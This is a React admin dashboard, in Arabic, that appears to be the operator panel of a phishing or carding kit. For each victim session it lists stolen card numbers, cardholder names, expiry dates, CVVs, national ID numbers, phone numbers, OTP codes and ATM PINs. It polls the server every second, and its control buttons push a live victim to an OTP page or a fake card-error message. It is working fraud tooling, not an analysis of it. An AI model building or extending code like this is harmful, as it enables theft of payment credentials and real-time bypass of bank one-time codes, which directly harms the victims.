import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
import { useLocation } from "wouter";
import { getToken, logoutAdmin } from "@/lib/auth";
import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions } from "@/lib/api";
import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut,
  Clock,
  ShieldCheck,
  CreditCard,
  KeyRound,
  Banknote,
  ChevronDown,
  ChevronUp,
} from "lucide-react";

interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}ث`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}د`;
  return `${Math.floor(mins / 60)}س`;
}

function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-3xl border bg-white p-4 text-right shadow-sm transition ${onClick ? "hover:shadow-md cursor-pointer active:scale-[0.98]" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-3">
        <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-3xl font-bold text-slate-900">{value}</span>
      </div>
      <p className="text-xs text-slate-500">{label}</p>
      {onClick && <p className="text-xs text-blue-500 mt-2">انقر للتفاصيل</p>}
    </button>
  );
}

function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
  if (!open) return null;
  return (
    <Dialog open onOpenChange={(value) => !value && onClose()}>
      <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل الجلسة</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-4">
          <div className="space-y-4">
            {rows.map((row) => {
              const data = parseData(row.data);
              return (
                <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between text-xs text-slate-500 mb-3">
                    <span>{row.type.toUpperCase()}</span>
                    <span dir="ltr">{formatAgo(row.createdAt)}</span>
                  </div>
                  <div className="grid gap-3 sm:grid-cols-2 text-xs text-slate-700">
                    {Object.entries(data).map(([key, value]) => (
                      <div key={key} className="rounded-2xl bg-slate-50 p-3">
                        <div className="font-semibold text-slate-900">{key}</div>
                        <div className="mt-1 font-mono break-all">{String(value ?? "")}</div>
                      </div>
                    ))}
                    <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
                      <div>IP: {row.ipAddress ?? "غير معروف"}</div>
                      <div>المستخدم: {row.userAgent ?? "غير معروف"}</div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

function SessionBox({
  sessionId,
  rows,
  blocked,
  selected,
  onToggleSelect,
  onControl,
  onBlock,
  onUnblock,
  onDelete,
  onOpenHistory,
}: {
  sessionId: string;
  rows: SubmissionRow[];
  blocked?: string;
  selected: boolean;
  onToggleSelect: () => void;
  onControl: (sessionId: string, action: string) => Promise<void>;
  onBlock: () => void;
  onUnblock: () => void;
  onDelete: () => void;
  onOpenHistory: () => void;
}) {
  const [expanded, setExpanded] = useState(true);
  const [showOldCards, setShowOldCards] = useState(false);
  const [loadingAction, setLoadingAction] = useState<string | null>(null);

  const initialRow = rows.find((row) => row.type === "initial");
  const initialData = parseData(initialRow?.data ?? null);
  const name = initialData.ownerName || "مستخدم";
  const phone = initialData.phone || "بدون هاتف";
  const cardRows = rows.filter((row) => row.type === "card");
  const latestCard = cardRows[cardRows.length - 1];
  const oldCards = cardRows.slice(0, -1);
  const cardData = parseData(latestCard?.data ?? null);
  const otpRows = rows.filter((row) => row.type.startsWith("otp"));
  const atmRows = rows.filter((row) => row.type === "atm");
  const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;

  const statusBadge = blocked
    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
    : otpRows.length > 0
      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
      : cardRows.length > 0
        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ينتظر</Badge>
        : <Badge variant="outline" className="text-slate-400 text-[10px]">بيانات فقط</Badge>;

  const formattedCard = latestCard && cardData.cardNumber
    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "—";

  useEffect(() => {
    setExpanded(cardRows.length > 0 || otpRows.length > 0);
  }, [cardRows.length, otpRows.length]);

  const handleControl = async (action: string) => {
    setLoadingAction(action);
    try {
      await onControl(sessionId, action);
    } finally {
      setLoadingAction(null);
    }
  };

  return (
    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""}`}>
      <div className="p-4">
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              checked={selected}
              onChange={onToggleSelect}
              className="mt-1 h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
            />
            <div className="min-w-0 text-right">
              <button type="button" onClick={() => setExpanded((value) => !value)} className="w-full text-right">
                <div className="flex items-center justify-between gap-3">
                  <div className="space-y-1">
                    <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                    <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500">
                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "—"}</span>
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>
                <div className="mt-2 flex items-center justify-between gap-2">
                  {statusBadge}
                  <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                </div>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-2 self-end">
            <button
              type="button"
              onClick={onOpenHistory}
              className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-2 text-xs text-slate-700 hover:bg-slate-100"
            >سجل كامل</button>
            <button
              type="button"
              onClick={blocked ? onUnblock : onBlock}
              className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
            >{blocked ? "رفع الحظر" : "حظر"}</button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
            >سلة المهملات</button>
          </div>
        </div>

        {expanded && (
          <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
            {latestCard ? (
              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                  <div>
                    <p className="text-xs font-semibold text-slate-500">أحدث بطاقة</p>
                    <p className="mt-2 text-lg font-bold text-slate-900 font-mono" dir="ltr">{formattedCard}</p>
                  </div>
                  <span className="text-xs text-slate-500" dir="ltr">{formatAgo(latestCard.createdAt)}</span>
                </div>
                <div className="mt-4 grid gap-3 sm:grid-cols-2 text-xs text-slate-600">
                  <div>المالك: {cardData.cardHolder ?? "—"}</div>
                  <div>انتهاء: {cardData.expiry ?? "—"}</div>
                  <div>CVV: {cardData.cvv ?? "—"}</div>
                  <div>الهوية: {initialData.idNumber ?? "—"}</div>
                </div>
                {oldCards.length > 0 && (
                  <div className="mt-4">
                    <button
                      type="button"
                      onClick={() => setShowOldCards((value) => !value)}
                      className="text-xs text-blue-600 hover:underline"
                    >{showOldCards ? "إخفاء" : "عرض"} البطاقات السابقة ({oldCards.length})</button>
                    {showOldCards && (
                      <div className="mt-3 space-y-3">
                        {oldCards.map((card) => {
                          const data = parseData(card.data);
                          return (
                            <div key={card.id} className="rounded-3xl border border-red-100 bg-red-50 p-3 text-xs">
                              <div className="flex items-center justify-between text-slate-500 mb-2">
                                <span>سجل سابق</span>
                                <span dir="ltr">{formatAgo(card.createdAt)}</span>
                              </div>
                              <div className="font-mono font-semibold text-red-700" dir="ltr">{(data.cardNumber ?? "—").toString().replace(/(.{4})/g, "$1 ").trim()}</div>
                              <div className="mt-2 flex flex-wrap gap-2 text-slate-500 text-[11px]">
                                <span>{data.cardHolder ?? "—"}</span>
                                <span>{data.expiry ?? "—"}</span>
                                <span>{data.cvv ? `CVV ${data.cvv}` : "—"}</span>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}
              </div>
            ) : (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-4 text-xs text-slate-500">
                لا توجد بطاقة حتى الآن — الجلسة جاهزة لإدخال النتائج.
              </div>
            )}

            {otpRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4">
                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
                  <span>رموز OTP</span>
                  <span>{otpRows.length} رمز</span>
                </div>
                <div className="space-y-2">
                  {otpRows.map((otp, index) => {
                    const data = parseData(otp.data);
                    return (
                      <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                        <div className="flex items-center justify-between gap-3 mb-2">
                          <span className="font-semibold text-green-700">محاولة {index + 1}</span>
                          <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                        </div>
                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "—"}</div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {atmRows.length > 0 && (
              <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
                <div className="flex items-center justify-between mb-3 text-slate-500">
                  <span>بيانات ATM</span>
                </div>
                {atmRows.map((atm) => {
                  const data = parseData(atm.data);
                  return (
                    <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
                        <span>رمز ATM</span>
                        <span dir="ltr">{formatAgo(atm.createdAt)}</span>
                      </div>
                      <div className="font-mono font-semibold">{data.atmCode ?? "—"}</div>
                    </div>
                  );
                })}
              </div>
            )}

            <div className="grid gap-2 sm:grid-cols-2">
              <button
                type="button"
                disabled={loadingAction === "go_otp"}
                onClick={() => void handleControl("go_otp")}
                className="rounded-3xl bg-green-600 px-4 py-3 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
              >{loadingAction === "go_otp" ? "...جارٍ" : "تحويل إلى OTP"}</button>
              <button
                type="button"
                disabled={loadingAction === "card_error"}
                onClick={() => void handleControl("card_error")}
                className="rounded-3xl border border-red-200 bg-red-50 px-4 py-3 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
              >{loadingAction === "card_error" ? "...جارٍ" : "إبلاغ خطأ في البطاقة"}</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [rawRows, setRawRows] = useState<SubmissionRow[]>([]);
  const [stats, setStats] = useState<StatsType | null>(null);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [blockedSessions, setBlockedSessions] = useState(getBlockedSessions());
  const [trashItems, setTrashItems] = useState(getTrashItems());
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [trashOpen, setTrashOpen] = useState(false);
  const [passwordOpen, setPasswordOpen] = useState(false);
  const [historyDialog, setHistoryDialog] = useState<{ sessionId: string; rows: SubmissionRow[] } | null>(null);
  const [settings, setSettings] = useState(getAdminSettings());
  const [passwordValue, setPasswordValue] = useState("");
  const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
  const intervalRef = useRef<number | null>(null);

  const sessions = useMemo(() => {
    const trashedIds = new Set(trashItems.map((item) => item.id));
    const grouped: Record<string, SubmissionRow[]> = {};
    rawRows
      .filter((row) => !trashedIds.has(row.id))
      .forEach((row) => {
        if (!grouped[row.sessionId]) grouped[row.sessionId] = [];
        grouped[row.sessionId].push(row);
      });

    Object.values(grouped).forEach((list) => list.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()));

    return Object.fromEntries(
      Object.entries(grouped).sort(([, a], [, b]) => {
        const aTime = new Date(a[a.length - 1].createdAt).getTime();
        const bTime = new Date(b[b.length - 1].createdAt).getTime();
        return bTime - aTime;
      }),
    );
  }, [rawRows, trashItems]);

  useEffect(() => {
    if (!getToken()) {
      setLocation("/admin");
    }
  }, [setLocation]);

  const fetchData = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    try {
      const [statsData, submissionsResponse] = await Promise.all([
        getAdminStats(token),
        getAllAdminSubmissions(token),
      ]);
      setStats(statsData);
      setRawRows(submissionsResponse.submissions);
    } catch (error) {
      console.error("Failed to load admin data:", error);
      if (error instanceof Error && (error.message.includes("Unauthorized") || error.message.includes("401"))) {
        logoutAdmin();
        setLocation("/admin");
      }
    }
  }, [setLocation]);

  useEffect(() => {
    void fetchData();
    const id = window.setInterval(() => {
      void fetchData();
    }, 1000);
    intervalRef.current = id;
    return () => {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
    };
  }, [fetchData]);

  useEffect(() => {
    setSelectedIds((current) => current.filter((sessionId) => Object.keys(sessions).includes(sessionId)));
  }, [sessions]);

  const handleLogout = useCallback(() => {
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleLogoutAll = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    await adminLogoutAll(token);
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleChangePassword = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    if (!passwordValue.trim()) {
      setPasswordStatus("أدخل كلمة مرور جديدة");
      return;
    }
    try {
      await adminChangePassword(token, passwordValue.trim());
      setPasswordStatus("تم تغيير كلمة المرور بنجاح.");
      setPasswordValue("");
    } catch (error) {
      console.error(error);
      setPasswordStatus("فشل تغيير كلمة المرور.");
    }
  }, [passwordValue]);

  const handleSaveSettings = useCallback(() => {
    saveAdminSettings(settings);
    setSettingsOpen(false);
  }, [settings]);

  const handleBlock = useCallback((sessionId: string, ownerName?: string) => {
    blockSession(sessionId, ownerName, "محظور بواسطة الإدارة");
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleUnblock = useCallback((sessionId: string) => {
    unblockSession(sessionId);
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleDeleteSession = useCallback((sessionId: string) => {
    const rows = sessions[sessionId] ?? [];
    rows.forEach((row) => {
      moveSubmissionToTrash({
        id: row.id,
        sessionId: row.sessionId,
        type: row.type,
        data: row.data,
        ipAddress: row.ipAddress,
        createdAt: row.createdAt,
        ownerName: parseData(rows[0]?.data ?? null).ownerName,
      });
    });
    setTrashItems(getTrashItems());
    setSelectedIds((current) => current.filter((id) => id !== sessionId));
  }, [sessions]);

  const handleDeleteSelected = useCallback(() => {
    selectedIds.forEach((sessionId) => handleDeleteSession(sessionId));
  }, [selectedIds, handleDeleteSession]);

  const handleRestoreTrash = useCallback((itemId: number) => {
    restoreTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleDeleteTrashItem = useCallback((itemId: number) => {
    deleteTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleEmptyTrash = useCallback(() => {
    clearTrash();
    setTrashItems([]);
  }, []);

  const handleControlAction = useCallback(async (sessionId: string, action: string) => {
    const token = getToken();
    if (!token) return;
    await sendAdminControl(sessionId, action, token);
    await fetchData();
  }, [fetchData]);

  const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
  const sessionCount = Object.keys(sessions).length;
  const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
  const otpCount = stats?.byType.filter((item) => item.type.startsWith("otp")).reduce((sum, item) => sum + item.count, 0) ?? 0;
  const atmCount = stats?.byType.find((item) => item.type === "atm")?.count ?? 0;
  const pendingCount = Object.values(sessions).filter((rows) => rows.some((r) => r.type === "card") && !rows.some((r) => r.type.startsWith("otp"))).length;
  const blockedCount = blockedSessions.length;
  const trashedCount = trashItems.length;
  const allSelected = sessionCount > 0 && selectedIds.length === sessionCount;

  return (
    <div className="min-h-screen bg-slate-100" dir="rtl">
      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg">
        <div className="mx-auto flex max-w-6xl flex-col gap-4 px-4 py-4 sm:px-6 lg:px-8">
          <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="space-y-2 text-right">
              <div className="flex flex-wrap items-center gap-2 text-lg font-bold text-slate-900">
                <ShieldCheck className="h-5 w-5 text-blue-600" />
                لوحة التحكم الإدارية
              </div>
              <p className="text-sm text-slate-500">تواصل مع بيانات الجلسات من أي مكان، وأدر المستخدمين بسهولة.</p>
            </div>
            <div className="flex flex-wrap items-center gap-2 justify-end">
              <Button size="sm" variant="outline" onClick={fetchData}>تحديث</Button>
              <Button size="sm" onClick={() => setSettingsOpen(true)}>إعدادات العروض</Button>
              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)}>تغيير كلمة المرور</Button>
              <Button size="sm" variant="destructive" onClick={handleLogoutAll}>خروج من كل الأجهزة</Button>
              <Button size="sm" variant="ghost" onClick={handleLogout}>خروج</Button>
            </div>
          </div>

          <div className="grid gap-3 sm:grid-cols-3">
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="text-xs text-slate-500">الجلسات</div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{sessionCount}</div>
            </div>
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="text-xs text-slate-500">الإدخالات</div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{stats?.totalSubmissions ?? 0}</div>
            </div>
            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
              <div className="flex items-center justify-between text-xs text-slate-500">
                <span>محظور / مهملات</span>
                <Badge className="bg-slate-100 text-slate-700">{blockedCount}</Badge>
              </div>
              <div className="mt-2 text-3xl font-bold text-slate-900">{trashedCount}</div>
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-6 sm:px-6 lg:px-8 space-y-6">
        <div className="grid gap-3 sm:grid-cols-4">
          <StatCard label="البطاقات" value={cardCount} icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600" />
          <StatCard label="OTP" value={otpCount} icon={<KeyRound className="w-4 h-4" />} color="bg-orange-100 text-orange-600" />
          <StatCard label="ATM" value={atmCount} icon={<Banknote className="w-4 h-4" />} color="bg-yellow-100 text-yellow-700" />
          <StatCard label="قيد المتابعة" value={pendingCount} icon={<Clock className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
        </div>

        <section className="rounded-3xl border border-slate-200 bg-white p-4">
          <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="text-right">
              <h2 className="text-lg font-semibold text-slate-900">الجلسات</h2>
              <p className="text-sm text-slate-500">اختر جلسة للعمل عليها أو حظر مستخدم أو حذف الجلسة.</p>
            </div>
            <div className="flex flex-wrap items-center gap-2 text-xs text-slate-500">
              <span>{sessionCount} جلسة</span>
              <span>|</span>
              <span>{cardCount} بطاقة</span>
              <span>|</span>
              <span>{otpCount} OTP</span>
            </div>
          </div>

          {sessionCount === 0 ? (
            <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-10 text-center text-slate-500">
              لا يوجد جلسات حالياً
            </div>
          ) : (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 text-xs text-slate-500">
                <div className="flex items-center gap-3">
                  <label className="inline-flex items-center gap-2">
                    <input
                      type="checkbox"
                      checked={allSelected}
                      onChange={() => {
                        if (allSelected) setSelectedIds([]);
                        else setSelectedIds(Object.keys(sessions));
                      }}
                      className="h-4 w-4 rounded border-slate-300 text-blue-600"
                    />
                    تحديد الكل
                  </label>
                  <span>{selectedIds.length} محدد</span>
                </div>
                <button
                  type="button"
                  disabled={selectedIds.length === 0}
                  onClick={handleDeleteSelected}
                  className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >نقل المحدد إلى المهملات</button>
              </div>
              <div className="space-y-4">
                {Object.entries(sessions).map(([sessionId, rows]) => (
                  <SessionBox
                    key={sessionId}
                    sessionId={sessionId}
                    rows={rows}
                    selected={selectedIds.includes(sessionId)}
                    onToggleSelect={() => {
                      setSelectedIds((current) => current.includes(sessionId)
                        ? current.filter((id) => id !== sessionId)
                        : [...current, sessionId]);
                    }}
                    blocked={blockedMap[sessionId]?.message}
                    onControl={handleControlAction}
                    onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
                    onUnblock={() => handleUnblock(sessionId)}
                    onDelete={() => handleDeleteSession(sessionId)}
                    onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
                  />
                ))}
              </div>
            </div>
          )}
        </section>
      </main>

      <SessionHistoryDialog
        open={Boolean(historyDialog)}
        rows={historyDialog?.rows ?? []}
        onClose={() => setHistoryDialog(null)}
      />

      <Dialog open={settingsOpen} onOpenChange={setSettingsOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>إعدادات العروض</DialogTitle>
          </DialogHeader>
          <ScrollArea className="flex-1 mt-4">
            <div className="space-y-4">
              {settings.offers.map((offer, index) => (
                <div key={offer.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <div className="text-sm font-semibold text-slate-900">{offer.name} ({offer.type})</div>
                      <p className="text-xs text-slate-500">السعر الحالي</p>
                    </div>
                    <input
                      type="number"
                      value={offer.price}
                      onChange={(event) => {
                        const nextOffers = [...settings.offers];
                        nextOffers[index] = { ...offer, price: Number(event.target.value) };
                        setSettings({ ...settings, offers: nextOffers });
                      }}
                      className="w-full max-w-[180px] rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm text-slate-900"
                    />
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
          <div className="mt-4 flex flex-wrap justify-end gap-2">
            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>إلغاء</Button>
            <Button size="sm" onClick={handleSaveSettings}>حفظ</Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={passwordOpen} onOpenChange={setPasswordOpen}>
        <DialogContent className="sm:max-w-[480px] max-h-[80vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>تغيير كلمة المرور</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 mt-4">
            <label className="block text-xs font-semibold text-slate-600">كلمة المرور الجديدة</label>
            <input
              type="password"
              value={passwordValue}
              onChange={(event) => setPasswordValue(event.target.value)}
              className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm"
            />
            {passwordStatus && <div className="text-xs text-slate-500">{passwordStatus}</div>}
            <div className="flex flex-wrap justify-end gap-2">
              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>إلغاء</Button>
              <Button size="sm" onClick={handleChangePassword}>حفظ</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={trashOpen} onOpenChange={setTrashOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>سلة المهملات</DialogTitle>
          </DialogHeader>
          <div className="px-4 pb-4">
            <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <p className="text-sm text-slate-600">يمكنك استعادة أو حذف العناصر نهائيًا.</p>
              <button
                type="button"
                onClick={handleEmptyTrash}
                className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
              >إفراغ المهملات</button>
            </div>
          </div>
          <ScrollArea className="flex-1 px-4 pb-4">
            {trashItems.length === 0 ? (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">لا يوجد عناصر في المهملات</div>
            ) : (
              <div className="space-y-4">
                {trashItems.map((item) => (
                  <div key={`${item.sessionId}-${item.id}`} className="rounded-3xl border border-slate-200 bg-white p-4">
                    <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                      <div className="text-right">
                        <p className="text-sm font-semibold text-slate-900">#{item.sessionId.slice(0, 8)}</p>
                        <p className="text-xs text-slate-500">{item.type} • {formatAgo(item.deletedAt)}</p>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          onClick={() => handleRestoreTrash(item.id)}
                          className="rounded-3xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs text-blue-700 hover:bg-blue-100"
                        >استعادة</button>
                        <button
                          type="button"
                          onClick={() => handleDeleteTrashItem(item.id)}
                          className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
                        >حذف نهائي</button>
                      </div>
                    </div>
                    <div className="mt-3 grid gap-2 sm:grid-cols-2 text-xs text-slate-500">
                      <div>IP: {item.ipAddress ?? "غير معروف"}</div>
                      <div>وقت الحذف: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </ScrollArea>
          <div className="mt-4 flex justify-end gap-2 px-4 pb-4">
            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>إغلاق</Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
